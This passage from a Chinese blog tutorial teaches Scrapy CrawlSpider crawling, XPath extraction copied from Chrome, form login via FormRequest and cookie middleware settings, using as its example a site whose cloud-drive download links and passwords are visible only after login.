  imgurl = <span class="keyword">scrapy.Field() </span><span class="comment">#图片的地址</span></span><br><span class="line">    yunlink = <span class="keyword">scrapy.Field() </span>   <span class="comment">#百度云盘的连接</span></span><br><span class="line">    password = <span class="keyword">scrapy.Field() </span>  <span class="comment">#百度云盘的密码</span></span><br><span class="line">    url = <span class="keyword">scrapy.Field() </span>   <span class="comment">#页面的地址</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>至于为啥声明的这些类容：各位自己去网站上观察一下、（主要是吧，贴在这儿的话 估计这博文就要被人道主义销毁了） 别忘记上一篇博文教大家的那种在 IDE 中运行 Scrapy 的方法哦！ 好上面的我们搞定、开始下一步编写 Spider 啦！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" alt="QQ图片20161021223818"></a> 在 spiders 文件夹中新建一个文件 haoduofuli.py（还不清楚目录和作用的小哥儿快去看看 Scrapy 的第一篇） 首先导入以下包:</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule, Request ##CrawlSpider与Rule配合使用可以骑到历遍全站的作用、Request干啥的我就不解释了</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor ##配合Rule进行URL规则匹配</span><br><span class="line"><span class="keyword">from</span> haoduofuli.items <span class="keyword">import</span> HaoduofuliItem ##不解释</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> FormRequest ##Scrapy中用作登录使用的一个包</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>详细介绍请参考：<a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/spiders.html" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/spiders.html</a> 中的：CrawlSpider、爬取规则(Crawling rules)、pare_start_url(response)|(此方法重写 start_urls)、以及 Spider 中 start_requests()方法的重写。 下面我带大家简单的玩玩儿顺便获取我们想要的东西。 前面提到了我们需要获取全站的资源、如果使用 Spider 的话就需要写大量的代码（当然只是相对而言的大量代码）！但是我们还有另一个选择那就是今天要说的 CrawlSpider！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/吃惊表情1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/吃惊表情1.jpg" alt="吃惊表情1"></a> 首先我们新建一个函数 继承 CrawlSpider（上一篇博文是继承 Spider 哦！） 见证奇迹的时刻到了!</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule, Request <span class="comment">##CrawlSpider与Rule配合使用可以骑到历遍全站的作用、Request干啥的我就不解释了</span></span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor <span class="comment">##配合Rule进行URL规则匹配</span></span><br><span class="line"><span class="keyword">from</span> haoduofuli.items <span class="keyword">import</span> HaoduofuliItem <span class="comment">##不解释</span></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> FormRequest <span class="comment">##Scrapy中用作登录使用的一个包</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myspider</span><span class="params">(CrawlSpider)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">'haoduofuli'</span></span><br><span class="line">    allowed_domains = [<span class="string">'haoduofuli.wang'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.haoduofuli.wang'</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'\.html'</span>,)), callback=<span class="string">'parse_item'</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        print(response.url)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>是不是很厉害！加上中间的空行也就不到二十行代码啊！就把整个网站历遍了！So Easy！！ 上面的几行代码的意思 很明了了啊！我只说说 rules 这一块儿 表示所有 response 都会通过这个规则进行过滤匹配、匹配啥？当然是后缀为.html 的 URL 了、callback=’parse<em>item’表示将获取到的 response 交给 parse_item 函数处理（这儿要注意了、不要使用 parse 函数、因为 CrawlSpider 使用的 parse 来实现逻辑、如果你使用了 parse 函数、CrawlSpider 会运行失败。）、follow=True 表示跟进匹配到的 URL（顺便说一句 allow 的参数支持正则表达式、虽然我也用得不熟、不过超级好使） 至于我这儿的 allow 的参数为啥是’.\html’；大伙儿自己观察一下我们需要获取想要信息的页面的 URL 是不是都是以.html 结束的？明白了吧！ 然后 rules 的大概运作方式是下面这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122164117.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122164117.png" alt="QQ截图20170122164117"></a> 图很清晰明了了（本人也是初学、如有错误 还请各位及时留言 我好纠正。）中间的数据流向是靠引擎来完成的。 好了 我们来看看效果如何： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-011812.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-011812.png" alt="QQ20170122-011812"></a> 这是我们返回 response 的 URL、一水儿的 URL 啊！完美！下面就可以进行提取数据了（诶！不对啊怎么没有没什么提取工具啊！还记得上篇博文说的不？下载器返回的 response 是支持 Xpath 的哦！我们直接使用 Xpath 来提取数据就行啦！） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情2.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情2.jpg" alt="表情2"></a> 那么问题来了！Xpath 没用过啊！不会用啊！这可咋整啊！别怕！草鸡简单的！！来不着急！ 先大声跟我念：Google 大法好啊！ 哈哈哈 没错、我们需要 Chrome（至于为啥不用 Firefox、因为不知道为啥 Firefox 的 Xpath 有时和 Chrome 的结构不一样 有些时候提取不到数据、Chrome 则没什么问题） 来来！跟着我的节奏来！包你五分钟学会使用 Xpath！学不会也没关系、毕竟你也不能顺着网线来打我啊！ 第一步：打开你的 Chrome 浏览器 挑选上面任意一个 URL 打开进入我们提取数据的页面（不贴图 容易被 Say GoogBay）： 第二步：打开 Chrome 的调试模式找到我们需要提取的内容（如何快速找到呢？还不知道的小哥儿 我只能说你实在是太水了） 点击下面红圈的箭头 然后去网页上点击你需要的内容就 哔！的一下跳过去了！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-013435.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-013435.png" alt="QQ20170122-013435"></a> 第三步：在跳转的那一行就是你想要提取内容的一行（背景色完全区别于其它行！！）右键 Copy ——Copy XPath: 就像下面我提取标题： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-013823.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-013823.png" alt="QQ20170122-013823"></a> 你会得到这样的内容： //</em>[@id=”post<em>content”]/p[1] 意思是：在根节点下面的有一个 id 为 post_content 的标签里面的第一个 p 标签（p[1]） 如果你需要提取的是这个标签的文本你需要在后面加点东西变成下面这样： //</em>[@id=”post_content”]/p[1]/text() 后面加上 text()标签就是提取文本 如果要提取标签里面的属性就把 text()换成@属性比如： //*[@id=”post_content”]/p[1]/@src So Easy！XPath 提取完毕！来看看怎么用的！那就更简单了！！！！ response.xpath(‘你 Copy 的 XPath’).extract()[‘要取第几个值’] 注意 XPath 提取出来的默认是 List。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" alt="QQ图片20161021224219"></a> 看完上面这一段 估计还没有五分钟吧 ！好了 XPath 掌握了！我们来开始取我们想要的东西吧！现在我们的代码应该变成这样了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule, Request <span class="comment">##CrawlSpider与Rule配合使用可以骑到历遍全站的作用、Request干啥的我就不解释了</span></span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor <span class="comment">##配合Rule进行URL规则匹配</span></span><br><span class="line"><span class="keyword">from</span> haoduofuli.items <span class="keyword">import</span> HaoduofuliItem <span class="comment">##不解释</span></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> FormRequest <span class="comment">##Scrapy中用作登录使用的一个包</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myspider</span><span class="params">(CrawlSpider)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">'haoduofuli'</span></span><br><span class="line">    allowed_domains = [<span class="string">'haoduofuli.wang'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.haoduofuli.wang'</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'\.html'</span>,)), callback=<span class="string">'parse_item'</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        item = HaoduofuliItem()</span><br><span class="line">        item[<span class="string">'url'</span>] = response.url</span><br><span class="line">        item[<span class="string">'category'</span>] = response.xpath(<span class="string">'//*[@id="content"]/div[1]/div[1]/span[2]/a/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line">        item[<span class="string">'title'</span>] = response.xpath(<span class="string">'//*[@id="content"]/div[1]/h1/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line">        item[<span class="string">'imgurl'</span>] = response.xpath(<span class="string">'//*[@id="post_content"]/p/img/@src'</span>).extract()</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们来跑一下！简直完美！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-020745.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-020745.png" alt="QQ20170122-020745"></a> 关于 imgurl 那个 XPath： 你先随便找一找图片的地址 Copy XPath 类似得到这样的： //<em>[@id=”post_content”]/p[2]/img 你瞅瞅网页会发现每一个有几张图片 每张地址都在一个 p 标签下的 img 标签的 src 属性中 把这个 2 去掉变成： //</em>[@id=”post_content”]/p/img 就变成了所有 p 标签下的 img 标签了！加上 /@src 后所有图片就获取到啦！（不加[0]是因为我们要所有的地址、加了 就只能获取一个了！） 关于 XPath 更多的用法与功能详解，建议大家去看看 w3cschool (^o^)/ 第一部分完工、开始第二部分的工作吧!登！录! <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a> 毕竟这些都不是我们要的重点！我们要的是资源 资源啊！能下载东西的地方！如果不是为了资源 那么爬虫将毫无意义（给工钱的另算）。 但是下载资源是隐藏的，需要登录才能看见（别找我要帐号、我也是借的别人的。） 我们先来看看这个网站是怎么登录的，使用 Firefox 打开www.haoduofuli.wang/login.php（为啥是Firefox、因为个人感觉Firefox的表单界面看起来很爽啊！哈哈哈） 打开页面之后开启调试模式（怎么开不说了）—开启持续日志（不然跳转之后没了） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122101749.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122101749.png" alt="QQ截图20170122101749"></a> 然后选择网络—选中 html 和 XHR（这样页面类容就会少很多、又不会缺少我们需要的东西） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122103140.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122103140.png" alt="QQ截图20170122103140"></a> 现在开始登录（顺手把记住登录也勾上）！调试窗口不要关啊！！！！登录完毕之后你会发现出现一些内容 我们找到其中方法为 post 的请求、然后选择 参数 就能看到我们需要的登录表单啦！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122104241.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122104241.png" alt="QQ截图20170122104241"></a> 我划掉的是帐号密码、这个位置应该显示你的帐号密码（这是很简单的一个登录表单、不通用但是思路是一样的。）找到了我们想要的东西我们开始登录吧 首先要知道 Scrapy 登录是如何实现的？ 借助于 FromRequests 这个包实现的（前面已经导入过了），下面开整。不需要太大的改动只需增加一些函数 就可以轻而易举的实现的登录。 将我们的 start_urls 中的地址换掉换成我们我们的登陆地址www.haoduofuli.wang/login.php变成这样：</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule, Request ##CrawlSpider与Rule配合使用可以骑到历遍全站的作用、Request干啥的我就不解释了</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor ##配合Rule进行URL规则匹配</span><br><span class="line"><span class="keyword">from</span> haoduofuli.items <span class="keyword">import</span> HaoduofuliItem ##不解释</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> FormRequest ##Scrapy中用作登录使用的一个包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">account = <span class="string">'你的账号'</span></span><br><span class="line">password = <span class="string">'你的密码'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> myspider(CrawlSpider):</span><br><span class="line"></span><br><span class="line">    name = <span class="string">'haoduofuli'</span></span><br><span class="line">    allowed_domains = [<span class="string">'haoduofuli.wang'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.haoduofuli.wang/wp-login.php'</span>]</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>那么问题来了！参考上面的流程图你会发现、这丫的没法登录表单没法写啊！start_urls 返回的 responses 就直接给 rules 进行处理了诶！我们需要一个什么方法来截断 start_urls 返回的 responses 方便我们把登录的表单提交上去！那么问题来了 ！该用啥？ 答案是：parse_start_url(response)这方法；此方法作用是当 start_url 返回 responses 时调用这个方法。官方解释如下： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122105258.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122105258.png" alt="QQ截图20170122105258"></a> 然后呢？当然是构造表单并通过 FormRequests 提交了！所以我们的程序现在就应该变成这样子了:</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule, Request ##CrawlSpider与Rule配合使用可以骑到历遍全站的作用、Request干啥的我就不解释了</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor ##配合Rule进行URL规则匹配</span><br><span class="line"><span class="keyword">from</span> haoduofuli.items <span class="keyword">import</span> HaoduofuliItem ##不解释</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> FormRequest ##Scrapy中用作登录使用的一个包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">account = <span class="string">'你的帐号'</span></span><br><span class="line">password = <span class="string">'你的密码'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> myspider(CrawlSpider):</span><br><span class="line"></span><br><span class="line">    name = <span class="string">'haoduofuli'</span></span><br><span class="line">    allowed_domains = [<span class="string">'haoduofuli.wang'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.haoduofuli.wang/wp-login.php'</span>]</span><br><span class="line"></span><br><span class="line">    def parse_start_url(self, response):</span><br><span class="line">        ###</span><br><span class="line">        如果你登录的有验证码之类的，你就可以在此处加入各种处理方法；</span><br><span class="line">        比如提交给打码平台，或者自己手动输入、再或者pil处理之类的</span><br><span class="line">        ###</span><br><span class="line">        formdate = &#123;</span><br><span class="line">                <span class="string">'log'</span>: account,</span><br><span class="line">                <span class="string">'pwd'</span>: password,</span><br><span class="line">                <span class="string">'rememberme'</span>: <span class="string">"forever"</span>,</span><br><span class="line">                <span class="string">'wp-submit'</span>: <span class="string">"登录"</span>,</span><br><span class="line">                <span class="string">'redirect_to'</span>: <span class="string">"http://www.haoduofuli.wang/wp-admin/"</span>,</span><br><span class="line">                <span class="string">'testcookie'</span>: <span class="string">"1"</span></span><br><span class="line">         &#125;</span><br><span class="line">        return [FormRequest.from_response(response, formdata=formdate, callback=self.after_login)]</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最后一句的意思是提交表单 formdate 并将回调 after_login 函数处理后续内容（一般用来判断是否登录成功） 然后开始请求我们需要爬取的页面 现在就变成这样了！</p>
                  <figure class="highlight scala">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from scrapy.spiders <span class="keyword">import</span> <span class="type">CrawlSpider</span>, <span class="type">Rule</span>, <span class="type">Request</span> ##<span class="type">CrawlSpider</span>与<span class="type">Rule</span>配合使用可以骑到历遍全站的作用、<span class="type">Request</span>干啥的我就不解释了</span><br><span class="line">from scrapy.linkextractors <span class="keyword">import</span> <span class="type">LinkExtractor</span> ##配合<span class="type">Rule</span>进行<span class="type">URL</span>规则匹配</span><br><span class="line">from haoduofuli.items <span class="keyword">import</span> <span class="type">HaoduofuliItem</span> ##不解释</span><br><span class="line">from scrapy <span class="keyword">import</span> <span class="type">FormRequest</span> ##<span class="type">Scrapy</span>中用作登录使用的一个包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">account = '你的帐号'</span><br><span class="line">password = '你的密码'</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myspider</span>(<span class="params"><span class="type">CrawlSpider</span></span>)</span>:</span><br><span class="line"></span><br><span class="line">    name = <span class="symbol">'haoduoful</span>i'</span><br><span class="line">    allowed_domains = [<span class="symbol">'haoduofuli</span>.wang']</span><br><span class="line">    start_urls = [<span class="symbol">'http</span>:<span class="comment">//www.haoduofuli.wang/wp-login.php']</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_start_url</span></span>(self, response):</span><br><span class="line">        ###</span><br><span class="line">        如果你登录的有验证码之类的，你就可以在此处加入各种处理方法；</span><br><span class="line">        比如提交给打码平台，或者自己手动输入、再或者pil处理之类的</span><br><span class="line">        ###</span><br><span class="line">        formdate = &#123;</span><br><span class="line">                <span class="symbol">'lo</span>g': account,</span><br><span class="line">                <span class="symbol">'pw</span>d': password,</span><br><span class="line">                <span class="symbol">'rememberm</span>e': <span class="string">"forever"</span>,</span><br><span class="line">                <span class="symbol">'wp</span>-submit': <span class="string">"登录"</span>,</span><br><span class="line">                <span class="symbol">'redirect_t</span>o': <span class="string">"http://www.haoduofuli.wang/wp-admin/"</span>,</span><br><span class="line">                <span class="symbol">'testcooki</span>e': <span class="string">"1"</span></span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> [<span class="type">FormRequest</span>.from_response(response, formdata=formdate, callback=self.after_login)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">after_login</span></span>(self, response):</span><br><span class="line">        ###</span><br><span class="line">        可以在此处加上判断来确认是否登录成功、进行其他动作。</span><br><span class="line">        ###</span><br><span class="line">        lnk = <span class="symbol">'http</span>:<span class="comment">//www.haoduofuli.wang'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="type">Request</span>(lnk)</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        <span class="type">Rule</span>(<span class="type">LinkExtractor</span>(allow=('\.html',)), callback=<span class="symbol">'parse_ite</span>m', follow=<span class="type">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span></span>(self, response):</span><br><span class="line">        item = <span class="type">HaoduofuliItem</span>()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            item[<span class="symbol">'categor</span>y'] = response.xpath('<span class="comment">//*[@id="content"]/div[1]/div[1]/span[2]/a/text()').extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'titl</span>e'] = response.xpath('<span class="comment">//*[@id="content"]/div[1]/h1/text()').extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'imgur</span>l'] = response.xpath('<span class="comment">//*[@id="post_content"]/p/img/@src').extract()</span></span><br><span class="line">            item[<span class="symbol">'yunlin</span>k'] = response.xpath('<span class="comment">//*[@id="post_content"]/blockquote/a/@href').extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'passwor</span>d'] = response.xpath('<span class="comment">//*[@id="post_content"]/blockquote/font/text()').extract()[0]</span></span><br><span class="line">            <span class="keyword">return</span> item</span><br><span class="line">        except:</span><br><span class="line">            item[<span class="symbol">'categor</span>y'] = response.xpath('<span class="comment">//*[@id="content"]/div[1]/div[1]/span[2]/a/text()').extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'titl</span>e'] = response.xpath('<span class="comment">//*[@id="content"]/div[1]/h1/text()').extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'imgur</span>l'] = response.xpath('<span class="comment">//*[@id="post_content"]/p/img/@src').extract()</span></span><br><span class="line">            item[<span class="symbol">'yunlin</span>k'] = response.xpath('<span class="comment">//*[@id="post_content"]/blockquote/p/a/@href).extract()[0]</span></span><br><span class="line">            item[<span class="symbol">'passwor</span>d'] = response.xpath('<span class="comment">//*[@id="post_content"]/blockquote/p/span/text()').extract()[0]</span></span><br><span class="line">            <span class="keyword">return</span> item</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>return Request（lnk）就表示我们的开始页面了 至于为啥多了一个 try 判断；完全是因为 这站长不守规矩啊！有些页面不一样·····我能怎么办 我也很无奈啊！ 都是被逼的。囧 好了！Spider 写完啦！但是我们的工作还没完！！！网站是靠什么知道这个 request 是否是登录用户发出的？答案是 Cookie！ 所以我们需要 下载器 在下载网页之前在 request 中加入 Cookie 来向网站证明我们是登录用户身份；才能获取到需要登录才能查看的信息！ 这个该怎么做？现在 Scrapy 的中间件派上用场了！ 关于 Cookie 中间件参考：<a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/downloader-middleware.html#module-scrapy.contrib.downloadermiddleware.cookies" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/downloader-middleware.html#module-scrapy.contrib.downloadermiddleware.cookies</a> 我们需要做的就是在 settings.py 中的 DOWNLOADER_MIDDLEWARES 开启这个中间件：scrapy.downloadermiddlewares.cookies.CookiesMiddleware 请注意！！！！！！ 每一个中间件会对 request 进行操作、你所做的操作可能会依赖于前一个中间件、所以每个中间件的顺序就异常的重要。具体该设置多少请参考： <a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/settings.html#std:setting-DOWNLOADER_MIDDLEWARES_BASE" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/settings.html#std:setting-DOWNLOADER_MIDDLEWARES_BASE</a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122165743.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122165743.png" alt="QQ截图20170122165743"></a> 中的值设置！！这点务必注意···如果不清楚依赖关系 请按照上图的值设置。 从上面可以看出 Cookie 中间件的值为 700 、我们在 settings.py 设置也应该为 700 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122170041.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ截图20170122170041.png" alt="QQ截图20170122170041"></a> 我注释掉的请无视掉！！！ 做好这些以后 Scrapy 运作的整个流程大概就变成了下面这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-232839.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-232839.png" alt="QQ20170122-232839"></a></p>
                  <figure class="highlight kotlin">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">return</span> Request(lnk) 这一个请求也算作 初始URL 只不过 不是start_urls的返回response 所以不会调用parse_start_url函数哦！</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
